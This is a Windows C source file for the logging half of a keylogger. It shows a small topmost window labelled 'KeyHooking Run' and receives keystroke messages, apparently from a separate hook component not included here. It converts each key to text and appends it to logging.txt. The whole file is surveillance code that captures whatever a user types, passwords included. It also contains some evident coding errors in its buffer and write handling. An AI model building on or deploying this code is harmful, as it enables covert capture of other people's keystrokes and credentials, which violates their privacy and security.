#include <windows.h>
#include <stdio.h>
#include <tchar.h>

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);

HINSTANCE g_hInst;

int cnt=0;
WORD input = NULL;
SYSTEMTIME st;

LPCTSTR lpszClass = TEXT("KeyHooking");

typedef struct _KEYINFO
{
	unsigned repeatCnt : 16;	//반복횟수 
	unsigned scanCode : 8;	//스캔 코드 
	unsigned extended : 1;	//확장 키 
	unsigned reserved : 4;	//예약됨 
	unsigned alt : 1;			//alt 키와 함께 눌렸는지 
	unsigned prevPressed : 1;	//이전 키 상태 
	unsigned notPressed : 1;	//현재 키 상태 
}KEYINFO, *PKEYINFO;

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdParam, int nCmdShow)
{
	HWND hWnd;
	MSG Message;
	WNDCLASS WndClass;
	
	g_hInst = hInstance;
	WndClass.cbClsExtra = 0;
	WndClass.cbWndExtra = 0;
	WndClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	WndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	WndClass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	WndClass.hInstance = hInstance;
	WndClass.lpfnWndProc = WndProc;
	WndClass.lpszClassName = lpszClass;
	WndClass.lpszMenuName = NULL;
	WndClass.style = CS_HREDRAW | CS_VREDRAW;
	
	RegisterClass(&WndClass);

	hWnd = CreateWindow(lpszClass, lpszClass, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, NULL, (HMENU)NULL, hInstance, NULL);
	ShowWindow(hWnd, nCmdShow);
	
	int width=GetSystemMetrics(SM_CXSCREEN);
	int height=GetSystemMetrics(SM_CYSCREEN);
	
	SetWindowPos(hWnd,HWND_TOPMOST,width-150,0,150,100,NULL);
	
	GetLocalTime(&st);

	while (GetMessage(&Message, NULL, 0, 0)){
		TranslateMessage(&Message);
		DispatchMessage(&Message);
	}

	return (int)Message.wParam;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam)
{
	HDC hdc;
	PAINTSTRUCT ps;
	
	PKEYINFO keyInfo;

	switch (iMessage){
		
	case WM_PAINT:
		TCHAR str[MAX_PATH];
		sprintf(str,"%d-%d-%d %d:%d:%d",st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond);
		
		hdc=BeginPaint(hWnd,&ps);
		TextOut(hdc,5,10,TEXT("KeyHooking Run"),14);
		TextOutA(hdc,5,30,str,strlen(str));
		EndPaint(hWnd,&ps);
		return 0;

	case WM_USER+1:
		keyInfo = (PKEYINFO)&lParam;
		if (!(keyInfo->extended) && !(keyInfo->alt) && !(keyInfo->notPressed))
		{
			BYTE keyState[MAX_PATH] = { 0, };

			GetKeyboardState(keyState);

			if (ToAscii((UINT)wParam, keyInfo->scanCode, keyState, &input, 0) == TRUE)
			{
				HANDLE hFile=NULL;
				TCHAR str[MAX_PATH]={0,};
				LARGE_INTEGER curPtr;
				curPtr.QuadPart=1;
				
				hFile=CreateFile(_T("logging.txt"),GENERIC_WRITE,0,NULL,OPEN_ALWAYS,0,NULL);
				
				switch (input)
				{
				case VK_BACK:
					cnt+=5;
					sprintf(str,"<BACKSPACE>");
					break;

				case VK_TAB:
					cnt+=2;
					sprintf(str,"<TAB>");
					break;

				case VK_RETURN:
					cnt+=3;
					sprintf(str,"<ENTER>");
					break;

				case VK_ESCAPE:
					cnt+=2;
					sprintf(str,"<ESC>");
					break;

				case VK_SPACE:
					cnt+=3;
					sprintf(str,"<SPACE>");
					break;

				default:
					cnt++;
					sprintf(str,"%c",input);
					break;
				}
				
				if(cnt>=50)
				{
					sprintf(str,"%s\r\n",str);
					cnt=0;	
				}
				
				SetFilePointerEx(hFile,curPtr,NULL,FILE_END);
				
				WriteFile(hFile,str,sizeof(TCHAR)*strlen(str)+1,new DWORD(0),NULL);
				
				CloseHandle(hFile);
			}
		}
		return 0;
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}

	return (DefWindowProc(hWnd, iMessage, wParam, lParam));
}
